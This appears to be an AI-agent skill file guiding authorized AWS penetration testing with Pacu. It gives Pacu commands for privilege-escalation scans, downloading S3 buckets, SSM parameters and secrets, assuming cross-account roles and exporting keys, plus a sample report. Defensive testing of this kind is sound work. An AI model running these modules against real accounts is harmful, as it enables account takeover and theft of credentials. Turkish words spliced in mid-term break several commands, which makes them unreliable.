---
name: performing-cloud-penetration-testing-with-pacu
description: Performing authorized AWS penetration testing using Pacu, the open-source AWS exploitation framework, to enumerate IAM configurations, discover privilege escalation paths, test credential harvesting,
  and validate security controls through systematic attack simulation.
tags:
- pacu
- siber-güvenlik
- aws
- offensive-security
- fetih
- cloud-security
- cybersecurity
- penetration-testing
- iam-exploitation
triggers:
- AWS
- Azure
- GCP
- alert
- api
- bulut güvenliği
- cloud
- cloud security
- container
- endpoint
- exploit
- log
category: cloud-security
source_subdomain: cloud-security
nist_csf:
- PR.IR-01
- ID.AM-08
- GV.SC-06
- DE.CM-01
adapted_for: fetih
---

# Performing Cloud Penetration Testing with Pacu


## Ne Zaman Kullanılır

- conducting yaparken authorized penetration testing of AWS environments
- validating yaparken the effectiveness of IAM policies, SCPs, and permission boundaries
- assessing yaparken the blast radius of a compromised set of AWS credentials
- testing yaparken Tespit capabilities of GuardDuty, Security Hub, and custom alerting
- building yaparken red team exercises against AWS cloud infrastructure

**Kullanma:** for unauthorized testing of any AWS account, for testing AWS infrastructure itself (covered by shared responsibility), for DDoS or volumetric attacks without AWS approval, or for production account testing without explicit authorization and breakglass procedures.

## Ön Gereksinimler

- Written authorization from the AWS account owner with defined scope and rules of engagement
- Pacu v1.5+ kurulu (`pip install pacu`)
- Test AWS credentials with limited starting permissions (simulates compromised credential scenario)
- CloudTrail logging enabled to capture all Pacu activity for post-engagement review
- GuardDuty enabled to validate Tespit of Pacu activities
- Emergency contact and rollback procedures documented

## İş Akışı

### Adım 1: Initialize Pacu Session and Configure Credentials

Kur: a Pacu session with the test credentials and define the engagement scope.

```bash
pip install pacu

pacu

Pacu > set_keys --key-alias pentest-target

Pacu > whoami

Pacu > list
Pacu > search iam
Pacu > search ec2
Pacu > search s3
```

### Adım 2: Enumerate IAM Configuration

Run IAM enumeration modules to map users, roles, policies, and group memberships.

```bash
Pacu > run iam__enum_users_roles_policies_groups

Pacu > run iam__enum_permissions

Pacu > run iam__get_credential_report

Pacu > run iam__enum_roles

Pacu > data iam
```

### Adım 3: Scan for Privilege Escalation Paths

Use Pacu's privilege escalation scanner to identify all exploitable escalation vectors.

```bash
Pacu > run iam__privesc_scan


Pacu > run iam__privesc_scan --escalate
```

### Adım 4: Enumerate and Test Data Access

Discover accessible data stores including S3, DynamoDB, RDS, and Secrets Manager.

```bash
Pacu > run s3__bucket_Bul:er

Pacu > run s3__download_bucket --bucket target-bucket --dl-names

Pacu > run ec2__enum
Pacu > run ec2__download_userdata

Pacu > run lambda__enum

Pacu > run secretsmanager__enum

Pacu > run ssm__download_parameters

Pacu > run ebs__enum_snapshots_unauth
```

### Adım 5: Test Lateral Movement and Persistence

Evaluate cross-account access, service exploitation, and persistence mechanisms.

```bash
Pacu > run sts__assume_role --role-arn arn:aws:iam::TARGET:role/CrossAccountRole

Pacu > run lambda__enum

Pacu > run ec2__enum

Pacu > run codebuild__enum

Pacu > run ecs__enum

Pacu > data all
```

### Adım 6: Validate Tespit and Generate Report

Review whether security controls Detected the testing activities and compile Bul:ings.

```bash
aws guardduty list-Bul:ings \
  --tespit etme (or)-id $(aws guardduty list-tespit etme (ors) --query 'tespit etme (orIds)[0]' --output text) \
  --Bul:ing-criteria '{
    "Criterion": {
      "updatedAt": {"GreaterThanOrEqual": ENGAGEMENT_START_EPOCH}
    }
  }' --output json

aws securityhub get-Bul:ings \
  --filters '{
    "CreatedAt": [{"Start": "ENGAGEMENT_START_ISO", "End": "ENGAGEMENT_END_ISO"}]
  }'

Pacu > export_keys --all
Pacu > data all > pacu-session-export.json

aws iam delete-user --user-name pacu-test-user 2>/dev/null
aws iam delete-access-key --user-name pacu-test-user --access-key-id AKIA... 2>/dev/null
```

## Key Concepts

| Term | Definition |
|------|------------|
| Pacu | Open-source AWS exploitation framework maintained by Rhino Security Labs, providing modular attack capabilities for authorized penetration testing |
| Privilege Escalation Scan | Automated analysis of IAM policies to identify known methods for elevating permissions from limited Erişim: administrative control |
| iam:PassRole | Critical IAM action allowing a principal to assign roles to AWS services, enabling indirect privilege escalation through Lambda, EC2, or Glue |
| Cross-Account Role Assumption | Using sts:AssumeRole to obtain temporary credentials in another AWS account through trust policy configurations |
| Rules of Engagement | Documented agreement defining the scope, methods, timing, and boundaries of a penetration testing engagement |
| Post-Exploitation | Activities performed after initial Erişim: demonstrate impact, including data access, lateral movement, and persistence establishment |

## Tools & Systems

- **Pacu**: AWS exploitation framework with 50+ modules for enumeration, escalation, persistence, and data exfiltration
- **CloudFox**: AWS enumeration tool for identifying attack paths from an attacker perspective
- **Principal Mapper**: IAM privilege escalation graph analysis tool for visualizing escalation paths
- **ScoutSuite**: Multi-cloud security assessment tool for identifying misconfigurations before testing
- **AWS CloudTrail**: Audit logging for capturing all Pacu activities during the engagement

## Common Scenarios

### Scenario: Red Team Assessment Starting from Compromised Developer Credentials

**Context**: A red team exercise simulates a scenario where an attacker obtains a developer's AWS access key from a leaked repository. The goal is to Belirle: the maximum impact achievable from this starting point.

**Approach**:
1. Initialize Pacu with the compromised credentials and run `whoami` to confirm identity
2. Run `iam__enum_permissions` to map the developer's effective permissions
3. Execute `iam__privesc_scan` to identify escalation paths from developer to admin
4. Discover the developer can call `iam:PassRole` + `lambda:CreateFunction`, creating a Lambda with an admin role
5. Exploit the escalation to obtain admin-level temporary credentials
6. Enumerate S3 buckets, download sensitive data, and access Secrets Manager
7. Verify whether GuardDuty Detected the escalation and data access activities
8. Clean up all test artifacts and Şunu belgele: complete attack chain

**Pitfalls**: Pacu modules can be noisy and generate many API calls in a short time. GuardDuty may trigger `Recon:IAMUser/MaliciousIPCaller` Bul:ings from the tester's IP. Coordinate with the SOC team to whitelist the testing IP or establish a clear communication channel to distinguish testing from real attacks. Always clean up persistence artifacts after testing.

## Output Format

```
AWS Penetration Test Report (Pacu)
=====================================
Target Account: 123456789012
Engagement Period: 2026-02-20 to 2026-02-23
Starting Credentials: Developer role (read-only S3, Lambda invoke)
Authorization: Signed ROE document #PT-2026-015

ATTACK PATH SUMMARY:
  Starting access: S3 read-only, Lambda invoke
  Maximum access achieved: AdministratorAccess (full account compromise)
  Time to admin: 47 minutes
  Tespit by GuardDuty: Yes (after 12 minutes)
  Tespit by Security Hub: Yes (after 18 minutes)
  SOC response time: 45 minutes (missed the escalation window)

PACU MODULES EXECUTED:
  iam__enum_users_roles_policies_groups: SUCCESS
  iam__enum_permissions: SUCCESS
  iam__privesc_scan: 3 escalation paths found
  s3__download_bucket: 4 buckets accessed
  lambda__enum: 12 functions enumerated
  secretsmanager__enum: 8 secrets retrieved

ESCALATION PATHS EXPLOITED:
  [1] iam:PassRole + lambda:CreateFunction -> AdminRole (CRITICAL)
  [2] sts:AssumeRole -> CrossAccountProdRole (HIGH)
  [3] iam:CreatePolicyVersion on dev-policy (CRITICAL)

DATA ACCESSED:
  S3 objects downloaded: 1,247 files (2.3 GB)
  Secrets Manager values: 8 secrets including DB credentials
  SSM parameters: 23 parameters including API keys

tespit etme (ION) RESULTS:
  GuardDuty Bul:ings generated: 7
  Security Hub Bul:ings: 12
  Custom CloudWatch alarms triggered: 3
  SOC acknowledged: Yes (45 min response)

RECOMMENDATIONS:
  1. Apply permission boundaries to all developer roles
  2. Remove iam:PassRole from non-admin principals
  3. Reduce SOC response time to < 15 minutes for IAM escalation alerts
  4. Implement SCP blocking iam:CreatePolicyVersion in non-admin OUs
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 6ef6e1c6c5679a47
-->

